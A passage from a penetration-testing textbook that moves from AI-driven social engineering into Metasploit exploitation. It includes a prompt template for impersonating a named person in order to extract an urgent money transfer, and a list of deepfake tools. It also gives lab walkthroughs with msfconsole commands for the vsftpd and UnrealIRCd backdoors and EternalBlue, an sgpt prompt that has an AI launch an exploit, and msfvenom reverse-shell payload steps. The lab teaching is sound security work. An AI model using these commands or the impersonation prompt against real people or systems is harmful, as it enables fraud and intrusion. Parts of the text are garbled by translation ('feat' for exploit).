lenges, particularly in relation to identity theft threats. Since AI can successfully replicate human vocabulary, syntax and grammar, writing patterns, tone and style, content and topics, emotional expression, and contextual adaptation, attackers can use it to create deceptive





216 Traditional vs Generative AI Pentesting

Figure 6.43 Phishing email through SGPT.

messages specifically designed to sound like real people. This impersonation can be used to trick victims into divulging private information or taking actions that could make money for the attacker.

Writing style for identity theft (example)

Now, we will craft an email by impersonating a person on the basis of his writing style. To do so, in the chat field, type.

Prompt Example: “Impersonate the writing style of Emma from the conversations given

below and craft a message for Alex asking for urgent assistance with covering a large

medical bill for her friend who met with an accident. The message should press Alex to

transfer the money to her account as soon as possible.

Following are the previous conversations between Emma and Alex on various topics:

Topic: Books and Storytelling

Alex:

Hey Emma, what do you think makes a story unforgettable?

Emma: An unforgettable story is one that delves into the labyrinth of human emotions, weaving an intricate tapestry of struggles, triumphs, and the indefinable beauty

of existence. It’s the kind of tale that lingers in your soul, like a melody you can’t

forget.





AI-driven social engineering and penetration testing 217

Alex:

I see what you mean. It’s like those books where you see yourself in the charac-

ters, right?

Emma: Exactly, Alex. When a character becomes a mirror, reflecting the deepest crevices of your own heart, that’s when a story transforms from mere words to an indelible imprint on the reader’s spirit.”

Now, craft a message in Emma’s style asking Alex for the urgent financial assistance

(Figure 6.44).

Identity theft using AI: Creation of Deepfake videos

Identity theft through deepfake videos has become a growing threat in today’s digital land-

scape. Attackers exploit advanced artificial intelligence technologies to generate hyper-

realistic videos of their targets, manipulating pre- existing audio and video samples (Chadha

et al., 2021; Rana et al., 2022; Westerlund, 2019). These samples can originate from various sources, such as social media platforms, public videos, or even hacked accounts. In some

cases, attackers recreate narratives using the voices of deceased individuals or clips associated with unknown identities. Using these materials, they produce videos that closely mimic the

gestures, facial expressions, and voices of the targeted individuals (Figure 6.45).

Figure 6.44 Impersonate writing style.





218 Traditional vs Generative AI Pentesting

Figure 6.45 DeepFake example.

Purpose of Deepfakes

These manipulated videos are often used in disinformation campaigns, online fraud, or to

manipulate public opinion. Victims of these videos—whether individuals or organizations—

are frequently unable to distinguish the authenticity of such content, fostering an environment of mistrust in the digital space.

Examples of malicious use cases include:

• Financial Fraud: Deepfakes can imitate company executives, instructing employees to urgently transfer funds to fraudulent accounts.

• Disinformation and Political Manipulation: Deepfakes are employed to sway public

opinion by disseminating false statements attributed to public figures.

• Cyberbullying and Personal Revenge: These videos can be weaponized to discredit individuals by fabricating compromising scenarios.

Technologies and tools used

To create these deepfakes, cybercriminals rely on powerful and accessible software that simplifies the process of producing fake content. Some popular tools include:

• Vidnoz: https:// www. vidnoz. com—An online tool for creating realistic videos.

• Deepfakesweb: https:// deepfakesweb. com— A user-friendly platform for generating

deepfakes with a simple interface.

• Synthesia: https:// www. synthesia. io— Allows the creation of videos with realistic digital avatars.

• DeepBrain AI: https:// www. deepbrain. io— Focuses on AI- generated visual content, including professional- quality deepfakes.

• Hoodem: https:// hoodem. com— A versatile tool for creating personalized deepfake videos.





AI-driven social engineering and penetration testing 219

CONCLUSION

This chapter has provided a detailed exploration of social engineering, its phases, and the techniques used by attackers to manipulate individuals and compromise organizational

security. We examined human- based, computer- based, and mobile- based social engineering

methods, including advanced AI- driven strategies such as phishing campaigns and deepfake

identity theft. Additionally, the chapter emphasized the importance of simulating social engineering attacks through penetration testing to evaluate vulnerabilities and enhance security awareness among employees. Practical countermeasures, such as identifying warning signs

and deploying security tools like phishing detection software, were discussed to mitigate the risks associated with these attacks. The insights and hands- on exercises offered in this chapter aim to empower readers to recognize and respond effectively to social engineering threats.

The next chapter transitions into data decoding and effective traffic analysis using sniffing and scanning techniques, advancing the journey of penetration testing.

REFERENCES

Chadha, A., Kumar, V., Kashyap, S., & Gupta, M. (2021). Deepfake: An overview. Proceedings of

Second International Conference on Computing, Communications, and Cyber- Security: IC4S 2020,

557–566.

Chamkar, S. A., Maleh, Y., & Gherabi, N. (2022). The human factor capabilities in security operation center (SOC). Lecture Notes in Networks and Systems, 357 LNNS, 579–590. https://doi.

org/10.1007/978- 3- 030-91738- 8_53

Hatfield, J. M. (2018). Social engineering in cybersecurity: The evolution of a concept. Computers &

Security, 73, 102–113.

Hwang, Y.-W., Lee, I.-Y., Kim, H., Lee, H., & Kim, D. (2022). Current status and security trend of osint.

Wireless Communications and Mobile Computing, 2022.

Krombholz, K., Hobel, H., Huber, M., & Weippl, E. (2015). Advanced social engineering attacks.

Journal of Information Security and Applications, 22, 113–122.

Maleh, Y. (2024). Web Application PenTesting: A Comprehensive Guide for Professionals. CRC Press.

Mouton, F., Malan, M. M., Leenen, L., & Venter, H. S. (2014). Social engineering attack framework.

2014 Information Security for South Africa, 1–9.

Nidhra, S. (2012). Black box and white box testing techniques - A literature review. International Journal of Embedded Systems and Applications, 2(2), 29–50. https://doi.org/10.5121/ijesa.2012.2204

Peltier, T. R. (2006). Social engineering: Concepts and solutions. Information Security Journal,

15(5), 13.

Rana, M. S., Nobi, M. N., Murali, B., & Sung, A. H. (2022). Deepfake detection: A systematic literature

review. IEEE Access, 10, 25494–25513.

Sadqi, Y., & Maleh, Y. (2022). A systematic review and taxonomy of web applications threats.

Information Security Journal: A Global Perspective, 31(1), 1–27. https://doi.org/10.1080/19393555.

2020.1853855

Salahdine, F., & Kaabouch, N. (2019). Social engineering attacks: A survey. Future Internet, 11(4), 89.

https://doi.org/10.3390/fi11040089

Tabatabaei, F., & Wells, D. (2016). OSINT in the Context of Cyber- Security. In: Akhgar, B., Bayerl, P., Sampson, F. (eds) Open Source Intelligence Investigation. Advanced Sciences and Technologies for Security Applications. Springer, Cham. https://doi.org/10.1007/978- 3- 319- 47671- 1_14

Westerlund, M. (2019). The emergence of Deepfake technology: A review. Technology Innovation

Management Review, 9(11), 40–53.

Zaoui, M., Yousra, B., Yassine, S., Yassine, M., & Karim, O. (2024). A comprehensive taxonomy of

social engineering attacks and defense mechanisms: Towards effective mitigation strategies. IEEE

Access, 12, 72224–72241.





Chapter 7

GenAI- driven exploitation testing

techniques

TECHNICAL REQUIREMENTS

• VMWare Software

• https:// www. vmware. com/

• VirtualBox Software

• https:// www. virtualbox. org/ wiki/ Downloads

• https:// www. vmware. com/ support/ developer/ ovf/

• https:// www. vmware. com/ go/ getfusion

• The Kali Linux, Penetration Testing Distribution

• https:// www. kali. org/ downloads/

• Metasploitable 2: Vulnerable Linux Platform

• http:// sourceforge. net/ projects/ metasploitable/ files/ Metasploitable2/

Before moving on to exploiting the target systems, it is essential to understand what an

exploit is. An exploit is a technique or code used to take advantage of a vulnerability on a system. For penetration testers, this means gaining access to a system to execute commands

or “compromise” a machine.

Exploitation can result in:

• Limited access: Execute commands with restricted rights.

• Elevated privileges: Obtain administrator rights via attack or elevation of privileges.

Possible actions after exploitation include:

• Transfer files or programs.

• Running applications (such as a network sniffer).

• Reconfiguring the system to use it as a hub for other targets.

• Install software.

Each action can have a significant impact, especially in a production environment. It is therefore crucial to respect the rules of engagement.

Why consider exploiting a target machine during a test?

It is important to recognize that not all tests inherently include exploitation. Certain target organizations just want a catalog of potential vulnerabilities or open ports in their test findings, without further verification of the targets’ exploitability.

220

DOI: 10.1201/9781003640318-7





GenAI-driven exploitation testing techniques 221

Various organizations advocate for the inclusion of exploitation in the examinations for

multiple reasons. Initially, by effectively attacking a system, we may diminish the incidence of false positives generated by our vulnerability detection program. If the attack successfully compromises the target system, it confirms the presence of vulnerability. It is important to acknowledge that the failure of an attack does not preclude the existence of a substantial vulnerability on the target computer. However, the exploit code utilized by the testers may have defects that lead to its failure. A separate malicious attacker may possess a superior exploit that may be successful. Consequently, we must consistently disclose any identified potential vulnerabilities, regardless of our ability to exploit them successfully (Austin & Williams, 2011).

An effective exploit provides evidence of a vulnerability, so incentivizing the target organization to address its actual risk more efficiently.

Moreover, by compromising a single machine, we may utilize that system as a fulcrum

to identify, analyze, and exploit additional systems. For instance, by infiltrating a machine within a DMZ, we may use that system to breach further devices in the DMZ or perhaps

within the internal network. If the penetration test encompasses client- side exploitation, we can infiltrate an internal system and subsequently pivot to access internal servers or servers in the DMZ, a formidable attack method that emulates the tactics employed by malicious

actors in contemporary scenarios. However, we should execute this sort of pivot only if the personnel of the target organization have openly consented to it.

This highlights the important aspect of exploitation: it facilitates post- exploitation actions that enhance our comprehension and presentation of the business ramifications and hazards

linked to the vulnerabilities we have exploited. Consequently, a significant portion of this book will be dedicated to post- exploitation operations. Figure 7.1 shows two network pivot

scenarios: Scenario 1 depicts an attacker pivoting from a DMZ system to an internal system

via the intranet, while Scenario 2 shows the attacker pivoting back through the DMZ to

reach the internal system, both navigating a firewall.

Reverse vs bind shell

Reverse shells and bind shells are two techniques often used in penetration testing and exploitation to establish a remote connection between an attacker’s machine (attack box) and a

target system (Maleh, 2024). Figure 7.2 illustrates the difference between reverse shell and bind shell.

Figure 7.1 Pivoting techniques.



222 Traditional vs Generative AI Pentesting

Figure 7.2 Reverse shell vs bind shell.

A reverse shell is initiated by the target system, which connects back to the attacker’s

machine. In this setup, the attacker sets up a listener on a specific port (e.g., TCP port 4444), waiting for an incoming connection. The target, upon execution of the malicious payload,

establishes a connection back to the attacker and grants command- line access. This technique is effective in bypassing firewalls or network address translation (NAT), as many organizations allow outbound traffic, making it easier for the reverse shell to connect to the attacker.

In contrast, a bind shell is initiated by the target system, which listens on a specific port and waits for the attacker to connect. The attacker then uses tools such as Netcat to connect to the target system’s open port. This method requires the target system’s firewall to allow inbound connections, which may be more restrictive. Bind shells can be challenging to execute in highly secured environments, as they rely on an open listening port on the target

machine (Kaushik et al., 2021).

Both techniques allow the attacker to gain remote access to the target, but their usage

depends on the network’s security configuration and firewall settings. Reverse shells are generally preferred in environments with outbound traffic permissions, while bind shells are

simpler but may be less effective in restrictive networks.





GenAI-driven exploitation testing techniques 223

Staged vs non- staged payloads

Staged and non- staged payloads are two approaches used in exploitation to deliver malicious

code to a target system (Balajinarayan, 2019).

A non- staged payload sends the entire exploit code (shellcode) in a single transmission.

This method requires more memory because the complete payload is delivered at once, mak-

ing it larger in size. While straightforward, non- staged payloads may encounter challenges in environments with limited bandwidth or memory constraints. Furthermore, if the payload is

too large, it may not execute successfully. For example, windows/meterpreter_reverse_tcp is a typical non- staged payload.

In contrast, a staged payload delivers the exploit in smaller, sequential parts. Initially, a small loader is sent to the target, which then fetches the remaining payload in stages. While this approach minimizes the initial payload size, making it easier to bypass some security

restrictions, it can introduce instability due to the reliance on multiple transmissions. If the connection between the attacker and the target is interrupted, the staged payload may fail to complete. An example of a staged payload is windows/meterpreter/reverse_tcp.

The choice between staged and non- staged payloads depends on the attack scenario, with

staged payloads preferred for stealth and non- staged payloads for simplicity and reliability.

Exploiting vulnerabilities: Categories of exploits

The majority of exploits fall into one of three main categories: service- side exploitation, client- side exploitation, and local privilege escalation. A penetration tester may utilize one or a combination of these attack types during a project. Each type of attack is suited to specific circumstances and objectives, often involving unique methods for exploiting vulnerabilities.

For instance, service- side exploitation targets network- facing services that listen for incoming traffic. The attacker crafts specific packets to exploit the vulnerability within the service, often bypassing the firewall, which must allow inbound traffic for the targeted service. Once access to a system inside the firewall is achieved, it becomes possible to pivot to other targets within the internal network, enhancing the scope of the attack (Fatima et al., 2023).

Exploiting vulnerabilities

• Once you have identified the vulnerabilities on your system or on a target system, the

next step is to exploit them to demonstrate the severity of the vulnerability and to pro-

vide security recommendations to fix them. Depending on their severity, vulnerabilities

can be used to:

• Retrieve information.

• Crash the affected system.

• Take complete control of the affected system.

Here are some general steps to exploit the identified vulnerabilities:

Vulnerability Severity Assessment:

Before you start exploiting a vulnerability, it is important to understand the severity of the vulnerability and its potential impact on the system. This can be done by reviewing the

vulnerability information, such as the severity rating, technical details, and references.

• Planning the attack: Once you have a clear understanding of the vulnerability, it’s time to plan the attack. This may involve identifying the tools needed to exploit the

vulnerability, creating a plan of attack, and documenting all steps.





224 Traditional vs Generative AI Pentesting

• Exploitation vulnerability: The next step is to exploit the vulnerability. This may involve the use of social engineering techniques, exploiting known security vulnerabilities, or using automated scripts and tools.

• Evaluation of results: After you exploit the vulnerability, it is important to evaluate the results to understand the impact of the attack on the system. This may involve

extracting data, changing configurations, or taking control of the system.

• Reporting and Documentation: Finally, it is important to document all the steps

involved in exploiting the vulnerability and to produce a detailed report of the

results. The report should include a description of the vulnerability, details of the

attack, findings, and recommendations for remediating the vulnerability.

If any of the scenarios are possible using a vulnerability identified, the vulnerability is said to be “exploitable.”

• In security jargon, an attack program using a vulnerability of a system to take con-

trol of it or crash it is called a “feat.” We are talking about:

• Remote exploit when the attack is possible remotely.

• Local exploit when prior access to the system is required before the attack can

be launched.

Metasploit

The Metasploit Framework comprises many user interfaces, a compilation of exploits, and

a repository of payloads. Within the framework of Metasploit, an exploit refers to a code

segment that leverages a specific vulnerability in a target application to execute a payload (Kennedy et al., 2024; Kennedy et al., 2011). The payload is a code segment that performs actions on a target system for the Metasploit user, such as initiating a remotely accessible command shell or gaining remote control of the target machine’s graphical user interface.

Metasploit enables the segregation of exploits from payloads, allowing us to pair a specific exploit for an identified vulnerability in a target environment with a selected payload that provides the requisite control over the target. For instance, one may select a payload that facilitates remote access to a command shell on a target Windows system due to proficient

command line capabilities in Windows. You may choose for a payload with remote GUI con-

trol due to your preference for graphical user interfaces. You could also favor the considerable versatility of the Meterpreter payload, which will be discussed in further detail hereafter.

For any exploit, there are typically numerous appropriate payloads available for selection.

The Metasploit user engages a suitable interface to choose an exploit and payload. The

user thereafter configures several parameters for the exploit and payload, utilizing Metasploit

to retrieve the outcomes on a target machine (Velu, 2022).

Moreover, Metasploit encompasses other auxiliary modules that enhance attack function-

alities, such as port scanning, vulnerability assessment, DNS searching, and numerous addi-

tional operations.

Metasploit further has post modules. Penetration testers utilize these subsequent to the

successful exploitation of a target system. Numerous instances include plundering the target to get important information, while others concentrate on manipulating the target system to serve the attacker’s objectives. Figure 7.3 shows Metasploit arsenal.

Many security researchers regularly publish new exploits for newly discovered vulnerabili-

ties in the form of Metasploit modules, integrated into the Metasploit Framework and ready

to use. Some researchers are working on new payloads, creating new capabilities that can be used by exploits already included in Metasploit.





GenAI-driven exploitation testing techniques 225

Figure 7.3 Metasploit arsenal.

• Metasploit has two main versions:

• Metasploit Pro: The commercial version that makes it easy to automate and man-

age tasks. This version has a graphical user interface (GUI).

• Metasploit Framework: The open source version that works from the command

line. We’ll use this version in this guide.

Useful Metasploit user interfaces

• msfconsole: It is a customizable Metasploit command- line interface and is the primary tool recommended for interaction with Metasploit.

• msfd: A daemon that listens on TCP port 55554 by default, providing access to msfconsole for any connecting user:

• Useful for a single installation of Metasploit shared among multiple users, all using

the same version concurrently.

• Lacks authentication and encryption for connections.

• msfrpcd: Enables Metasploit to be controlled via XML using remote procedure calls (RPC), listening on TCP port 55553, and offering SSL- based access.

• msfcli: A command- line tool providing all options within a single command, useful for scripting purposes.

• msfvenom: Combines payload generation capabilities into a standalone file (EXE,

Linux binary, JavaScript, VBA, etc.), aiding in payload evasion and bypass.

Metasploit modules

• Auxiliary: Various tools, including port scanners, vulnerability checkers, denial- of-service tools, and more.





226 Traditional vs Generative AI Pentesting

Figure 7.4 Meterpreter.

• Encoders: Modules that transform exploits and payloads into different formats to

bypass filters for certain characters and evade signature- based detection.

• Exploits: Metasploit’s arsenal of attack tools used to target system vulnerabilities.

• Nops: Modules that create NOP (no operation) sleds using machine language instructions. These increase the likelihood of successful exploitation by filling gaps in the

exploit code.

• Payloads: A collection of payloads used to execute commands or establish control over the target system.

• Post: Post- exploitation modules designed for tasks such as looting sensitive data or manipulating compromised systems.

Meterpreter

Meterpreter (Metasploit Interpreter) is a payload within the Metasploit Framework that acts as a specialized shell operating within the memory of an exploited process. This design provides stealth and flexibility for post- exploitation activities. Figure 7.4 illustrates an example

of exploitation where an attacker exploits a target machine’s process, injecting the Metpreter payload along with two DLLs (DLL 1 and DLL 2) into the exploited process.

Here are the key characteristics of Meterpreter:

• Memory- based Execution: Meterpreter runs entirely in the memory of an exploited process, avoiding the creation of separate processes and leaving a minimal footprint on

the target system.

• DLL Injection: It consists of multiple DLLs injected directly into the memory of the process, ensuring stealth and adaptability.

• Cross- platform Availability: Meterpreter is available for environments such as Windows, Linux, PHP, and Java. A macOS version is also under development.

• Encrypted Communications: All communications between the attacker and Meterpreter are encrypted using TLS.

• Note: If HTTPS staging is not used to deliver Meterpreter, the staging process may remain unencrypted.

Basic commands in Meterpreter

Meterpreter provides a variety of commands for interacting with and manipulating the target system. Following are some basic commands and their functionalities:





GenAI-driven exploitation testing techniques 227

• ? / help: Displays a help menu with available commands.

• exit / quit: Exits the Meterpreter session.

• sysinfo: Displays information about the target system, including the operating system name and type.

• shutdown / reboot: Executes system shutdown or reboot operations.

• reg: Reads from or writes to the Windows registry.

• shell: Launches a command shell to execute system- level commands.

Process commands

• getpid: Retrieves the ID of the process where Meterpreter is running.

• getuid: Displays the user ID associated with the process running Meterpreter.

• ps: Lists processes currently running.

• kill: Terminates a specified process.

• execute: Runs a specified program.

• migrate: Switches to another process for enhanced stability or privilege retention.

File System Commands

• cd: Changes the directory in the target system.

• lcd: Adjusts local directories on the attacker’s machine.

• pwd/getwd: Displays the current working directory.

• ls: Lists the content of a directory.

• cat: Displays the contents of a file.

• download/upload: Transfers files between the attacker’s system and the target.

• mkdir/rmdir: Creates or removes directories.

• edit: Modifies files using a default editor like vi or vim.

Networking Commands

• ipconfig: Retrieves network information (interface name, MAC address, IP address, subnet mask).

• route: Adds, removes, or modifies network routes.

• portfwd: Creates TCP relays for pivoting through the network, enabling connections to additional targets.

User Interface Functionalities

• Screenshot (screenshot -p): Captures the current desktop screen and saves it as an image.

• Input Device Control (uictl): Enables or disables keyboard/mouse input devices, useful for remote control but risky for stealthy penetration tests.

These capabilities make the Meterpreter a versatile and stealthy tool in penetration testing, enabling deep interaction with the target machine while maintaining minimal detectability.

Feat- db: searchsploit

• We have already mentioned exploit- db in the search engine section. Searchsploit is a tool available on Kali Linux which is an offline copy of exploit- dB, containing copies of exploits on your system.

• As a reminder, exploit- db is a project maintained by Offensive Security. It is a free

archive of public exploits that are gathered through submissions, mailing lists, and

public resources.





228 Traditional vs Generative AI Pentesting

• We can run searchsploit without any parameters to display its usage and options that allow us to refine our search, change the output format, update the database, etc, as

shown in Figure 7.5.

• We can search with searchsploit by application name and/or vulnerability type. For example, in the excerpt shown in Figure 7.6, we search searchsploit for Wordpress-related exploits that we can use—no download needed!

Figure 7.5 Searchploit tool.

Figure 7.6 Searching for wordpress exploits on searchploit.





GenAI-driven exploitation testing techniques 229

Figure 7.7 Updating the exploit- db database.

• Since searchsploit is an offline copy of exploit- db, it is recommended that you update it regularly to retrieve the latest exploits, especially before starting a PT, as illustrated in

Figure 7.7.

Find modules

When conducting penetration testing on various targets, you may come across a case where

Metasploit doesn’t have an exploit that you can use. Maybe you haven’t encountered such a

situation, but you want to keep your Metasploit database up to date. In both cases, it is useful to know where to find the modules and how to add them in Metasploit. There are a number

of public repositories that host modules that are available for download. These websites are your first resource for finding modules for Metasploit.

Feat- DB

The first one we’ll look at is the exploit database (commonly known as Exploit- DB). You’ll recognize Exploit- DB in the previous chapter (Chapter 3, Gathering Information) when we worked with Google dorks. Exploit- DB can be accessed directly at https:// www. exploit-

db. com.

The Website has a section called exploits, where you can find modules published by secu-

rity companies and individuals. The website offers features such as module verification (V), the ability to download the module (D), and the ability to download the vulnerable application (A), if applicable. These functions are represented in the title bar like D, A, and V, as shown in the screenshot in Figure 7.8.

Rapid7 exploits database

Rapid7 is another public resource where you can get modules (see Figure 7.9).

This deposit is accessible at the following address: https:// www. rapid7. com/ db/ modules.

Rapid7’s exploit database is very similar to Exploit- DB; however, it does not contain additional features such as the Google Hacking database:





230 Traditional vs Generative AI Pentesting

Figure 7.8 Exploit- db database.

Figure 7.9 Rapid7 exploit database.





GenAI-driven exploitation testing techniques 231

0day.today

0day.today is another repository that contains a number of modules. The difference with

0day.today is that there are exploits available that can be purchased, as shown in the screenshot in Figure 7.10. Some of these paid exploits claim to perform activities such as taking over Snapchat and stealing Facebook groups. Other achievements are available for free.

Preparing the Metasploit environment

Metasploit: The Framework uses PostgreSQL as its database, so you need to launch it by

running the following command in the terminal:

$ service postgresql start

You can verify that PostgreSQL is running by running the following command:

$ service postgresql status

With PostgreSQL running, you must create and initialize the msf database by running the

following command:

$ msfdb init

Identifying the target of the attack

As shown in Figure 7.11, you need to launch the netdiscover tool to find out which machines to operate.

Use nmap to look for vulnerabilities on your target machine’s IP address, in our example:

192.168.64.2, as shown in Figure 7.12.

Identify the target’s vulnerabilities

The target, Metasploitable2- Linux, is an intentionally vulnerable machine. It contains vulnerabilities that could be exploited remotely.

Vsftpd Backdoor v2.3.4

This backdoor was introduced into the vsftpd- 2.3.4.tar.gz archive between June 30 and July 1, 2011 and July 1, 2011, according to the latest available information. This backdoor was

removed on July 3, 2011. Metasploit can exploit the malicious backdoor that has been added

to the VSFTPD download archive.

There are other vulnerabilities that can be exploited on the target. You can find a list of all the vulnerabilities in Metasploitable2 here:

https:// community. rapid7. com/ docs/ DOC- 1875

Et http:// chousensha. github. io/ blog/ 2014/ 06/ 03/ pentest- lab- metasploitable- 2/.

Launch attacks using the Metasploit framework

After identifying the target and vulnerabilities, you can use your weapon (i.e., the Metasploit Framework) to launch attacks.



232

Traditional vs Generativ

e AI P

entesting

Figure 7.10 Exploit 0day.today database.





GenAI-driven exploitation testing techniques 233

Figure 7.11 Netdiscover tool.

Figure 7.12 Vulnerability scanning with nmap.

Figure 7.13 Search exploit vsftp 2.3.4.

As a first step, you should look for an exploit for this vulnerability, as shown in Figure 7.13.





234 Traditional vs Generative AI Pentesting

You can launch the Metasploit console by clicking on the Metasploit icon or by typing the

command msfconsole in a terminal, as shown in Figure 7.14.

You can use msfconsole to check if the database is connected as shown in the screenshot

in Figure 7.15.

After you look for the exploit available for vsftpd 2.3.4, as shown in Figure 7.16.

Figure 7.14 msfconsole.

Figure 7.15 Database verification.

Figure 7.16 Exploit vsftp 2.3.4.





GenAI-driven exploitation testing techniques 235

And you use the exploit available for this vulnerability with the command use exploit/

unix/ftp/vsftps_234_backdoor, as shown in Figure 7.17.

You check the available options with the show options command, as shown in Figure 7.18.

You mention the RHOST and RPORT options, as shown in Figure 7.19.

After you run the exploit with the exploit command, as shown in Figure 7.20.

The example shown in Figure 7.21 that you can remotely access the Linux target using the backdoor.

The screenshot in Figure 7.22 shows the operation process using the Metasploit console.

We can see that Metasploit has managed to get a shell session, and we can fulfill the orders $whoami and $uname -a to show that we are in Kali Linux’s Metasploitable2 machine.

Figure 7.17 Using the vsftp 2.3.4 exploit.

Figure 7.18 Options de l’exploit.

Figure 7.19 Options RHOST et RPORT.

Figure 7.20 Execute exploit vsftp 2.3.4.





236 Traditional vs Generative AI Pentesting

Figure 7.21 Remote access using the vsftp 2.3.4 backdoor.

Figure 7.22 Opening a shell session on the target machine.

Exploit FTP Backdoor through GenAI

Figure 7.23 displays an exploits a VSFTPD backdoor vulnerability through SGPT.

Prompt: sgpt --shell “Use Metasploit to exploit the VSFTPD backdoor

vulnerability on Metasploitable2 at 192.168.2.21.”

Exploit with the UnreaIRCD IRC backdoor

Now you’re going to use another Vsftpd v2.3.4 backdoor to attack. You can remotely access

the Linux target using a backdoor from the IRC daemon UnreaIRCD. Now, you’re going

to use another vulnerability of the target machine (i.e., the Vsftpd backdoor) to launch an attack. The steps are similar to the previous attack.

$ msconsole

msf > use exploit/unix/irc/unreal_ircd_3281_backdoor

msf exploit(unreal_ircd_3281_backdoor) > set RHOST @IP_Targetmsf

exploit(unreal_ircd_3281_backdoor > set payload cmd/unix/bind_perl

msf exploit(unreal_ircd_3281_backdoor > exploit

$ whoami

$ uname -a





GenAI-driven exploitation testing techniques 237

Figure 7.23 Metasploit exploit VSFTP through SGPT.

Figure 7.24 Lanche exploit unreal_ircd_3281_backdoor.

You are using the exploit/unix/irc/unreal_ircd_3281_backdoor exploit, as shown in

Figure 7.24.





238 Traditional vs Generative AI Pentesting

You can check the available payloads with the show payloads command, as shown in

Figure 7.25.

Use the payload bind_perl that allows you to open a shell On target, as shown in Figure 7.26.

Now, you can run the exploit and start interacting with shell on the target, as shown in

Figure 7.27.

Metasploit options, shells, and payloads

Metasploit has a number of options, shells, and payloads that are used when you select dif-

ferent exploits.

Covering all the possible options in all the feats is beyond the scope of this book, but I will explain how to find the options and discuss the most common options that are used. It is

important to understand the different shells and payload options that exist.

Figure 7.25 Payloads available exploit unreal_ircd_3281_backdoor.

Figure 7.26 Payload bind_perl.





GenAI-driven exploitation testing techniques 239

Figure 7.27 Launch the exploit unreal_ircd_3281_backdoor.

Feat SMB on Windows via EternalBlue

Some vulnerabilities and exploits make headlines thanks to their catchy names and impressive potential for harm. EternalBlue is one of those feats. Originally linked to the NSA, this zero-day exploited a flaw in the SMB protocol, affecting many Windows machines and wreaking

havoc everywhere. Figure 7.28 shows how to check if SMB is enabled on windows machine.

Figure 7.28 SMB service enabled.





240 Traditional vs Generative AI Pentesting

Finding a vulnerable target

We can use Nmap as an alternative to CT scan Metasploit to find out if a target is vulnerable to EternalBlue. Nmap’s scripting engine is a powerful feature of the basic tool that allows you to run all kinds of scripts against a target.

Here, we will use the smb- vuln- ms17- 010 script to check the vulnerability, as shown in

Figure 7.29. Our target will be an unpatched copy of Windows 10. Evaluation copies can be downloaded from Microsoft’s site so that you can follow the process if you wish.

We can specify a single script to run with the --script option, as well as the -v flag for the verbosity and IP address of our target. First, change the directory in case you’re still running Metasploit.

Figure 7.30 shows the nmap scan result.

Find a module to use

There is a CT scan that we can run to determine if a target is vulnerable to MS17- 010. It’s always a good idea to do the necessary recce like this. Otherwise, you could lose a lot of time if the target isn’t even vulnerable, as shown in Figure 7.31.

Then we launch the exploit, as shown in Figure 7.32.

Once we have determined that our target is indeed vulnerable to EternalBlue, we can use

the following exploit module, which is based on the research we just performed, as shown

in Figure 7.33.

Figure 7.29 Nmap avec script script smb- vuln- ms17- 010.

Figure 7.30 Nmap search result.





GenAI-driven exploitation testing techniques 241

Figure 7.31 Exploit options smb_ ms17- 010.

Figure 7.32 Options RHOST et LPORT l’exploit smb_ ms17- 010.

Figure 7.33 Exploit Launched smb_ ms17- 010.

That should be it, so the only thing left to do is to launch the feat. Use the exploit com-

mand to launch it.

Shells

There are two types of shells within the Metasploit Framework. These are bind shells and

reverse shells.

A bind shell opens a new service on the target machine and asks you to connect to it to get a shell. The problem with these shells is that firewalls block connections on random ports by default, making the bind shell less efficient than the reverse shell.

A reverse shell pushes a connection back to the attack machine instead of waiting for you

to connect to it, as shown in Figure 7.34. It requires a listener to be set up on the attack machine so that it can listen for a connection from the target machine.





242 Traditional vs Generative AI Pentesting

Figure 7.34 Taking the reverse shell on the target machine.

A common practice is to configure the listener on port 80 or 443. These ports are directly

linked to http and https respectively and are linked to daily web traffic. It is simply not possible to block these ports, making them prime targets for reverse shell connections.

Verify that the target is compromised

We can verify that we have compromised the target by running commands such as sysinfo to

get information about the operating system.

Lab: Penetration testing with Metasploit

The goal of this lab is to use several features of Metasploit to attack and gain shell access on a Windows machine. To achieve this goal, we use a variety of useful components of Metasploit, as well as a web server based on Python called http.server.

In particular, here are the components of Metasploit with whom you will become familiar

in this laboratory:

▪ msfvenom: Penteksters can use this program from the Metasploit Framework for creating malicious standalone payload files. In this lab, you create a malicious EXE file that

provides access to the shell of a Windows machine where it is running.

▪ http.server : This web server Python- based is not part of Metasploit but can be used with Metasploit to serve files in a convenient and flexible way.

▪ msfconsole: The Metasploit program, The Framework Console, is Metasploit’s com-

mand center, allowing you to configure the framework and interact with sessions on

compromised machines.

▪ exploit/multi/handler: This generic exploit allows you to configure Metasploit to wait for incoming connections (i.e., “phone home”) from compromised targets. When this

“multi/handler” receives a connection, it returns a Metasploit payload to be executed

on the target.





GenAI-driven exploitation testing techniques 243

▪ Payload/Shell/reverse_tcp: This payload establishes a connection from the target

machine to Metasploit, giving you shell access to the target, that is, a reverse shell. It is created from the shell step and the reverse_tcp step.

Exploit Steps

The exploit consists of the following steps, numbered 1 to 5. These same step numbers are

included in the architecture figure in Figure 7.35 as well as in the different sections of the lab.

So, you can follow the steps in the lab.

Step 1: On Linux, use the msfvenom program The Metasploit to create a malicious EXE

file that provides a shell connection Reverse to MSFCONSOLE when running on

a Windows machine. Call the malicious file file.exe.

Step 2: Still on Linux, run a web server called http.server, which is a Python- based program that can serve file- based web pages in your file system. You will serve file.exe.

Step 3: Configure msfconsole on Linux to wait for a connection to arrive from a Windows machine being operated that is running file.exe. To do this, configure exploit/multi/

handler (known as multi/handler) with a shell payload/reversetcp.

Step 4: On Windows, launch a browser and surf to your Linux machine. You will be

asked to perform file.exe, which you should do.

Step 5: When file.exe runs on Windows, it connects to the multi/handler in msfconsole on Linux. You’ll see this incoming connection and start interacting with your shell

session on the compromised Windows machine. In each of these steps, you will

become familiar with the use and configuration of msfvenom and msfconsole,

interaction with and control of sessions on an exploited target.

Step 1: Construction of the malicious file

Run msfvenom with the option -help to get a brief overview of its syntax. To use the tool, you need to specify the payload you want with the indicator -p, a list of variables for that payload (including port numbers to connect to), and the format of the payload you want (including

EXE, which you specify with a -f exe):

Figure 7.35 Exploit steps.



244 Traditional vs Generative AI Pentesting

Figure 7.36 Menu help msfvenom.

View the results of msfvenom -help, as shown in Figure 7.36.

Now, take a look at the output formats using the –list format, as shown in Figure 7.37.

There are a lot of supported formats! The -f exe option creates a Windows executable.

Now, launch msfvenom to transform windows/shell/reverse_tcp into a standalone file.

When it is executed.

You want this payload to connect to your Linux machine, so you need to configure the

LHOST (i.e., localhost) to your Linux IP address to connect to you. Configure the local port it will connect to (LPORT) to 9999. Finally, put a -f exe at the end of the list of items for MSFVENOM. This tells them to create a file in Windows EXE format. The msfvenom tool

